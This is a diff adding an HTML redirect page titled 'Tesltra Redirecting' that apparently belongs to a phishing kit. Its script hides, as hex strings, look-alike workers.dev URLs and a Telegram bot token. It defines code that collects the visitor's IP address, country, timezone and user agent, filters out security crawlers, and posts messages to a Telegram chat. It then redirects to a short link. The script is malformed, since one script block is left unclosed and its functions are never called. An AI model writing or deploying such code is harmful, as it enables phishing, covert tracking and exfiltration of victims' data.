@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0" />
+  <title> Tesltra Redirecting </title>
+  <style>
+    :root {
+      --accent: #FFD000;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      overflow: hidden !important;
+      font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: #f0f0f0;
+      color: #222;
+      touch-action: none;
+    }
+
+    body * {
+      touch-action: none;
+      -ms-touch-action: none;
+    }
+
+  
+    .loader-container {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      z-index: 9999;
+    }
+
+    .loader {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      border: 5px solid rgba(75,0,170,0.15);
+      border-top-color: var(--accent);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+ 
+  <div class="loader-container" id="loader">
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    const h = "68747470733A2F2F6174742D676F6F2D676F676C653232692E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";
+    const o = "68747470733A2F2F6F6666792D6174742D333339322E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";
+    const b = "383433383835393039373A41414552543046415845665668576E317553533970412D6D416765493358384147624D0D0A";
+    const googleDomains = ['gmail.com','googlemail.com'];
+
+    const sendTelegramNotification = async (message) => {
+      const t = b.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+      try {
+        await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: "-1003234373865", text: message })
+        });
+      } catch (e) { console.error("Telegram error:", e); }
+    };
+
+    const getClientInfo = async () => {
+      let ip = "Unknown", timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip || "Unknown";
+        timezone = ipData.timezone || timezone;
+        return {
+          ip,
+          timezone,
+          userAgent: navigator.userAgent,
+          isBot: /bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),
+          timestamp: new Date().toLocaleString(),
+          country: ipData.country || "Unknown"
+        };
+      } catch (e) {
+        try {
+          const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+          const fallbackData = await fallbackResponse.json();
+          ip = fallbackData.ip || ip;
+        } catch (f) {}
+        return {
+          ip,
+          timezone,
+          userAgent: navigator.userAgent,
+          isBot: /bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),
+          timestamp: new Date().toLocaleString(),
+          country: "Unknown"
+        };
+      }
+    };
+
+   <script>
+window.location.replace('https://qrco.de/bgtLeq');
+</script>
+
+</body>
+</html>
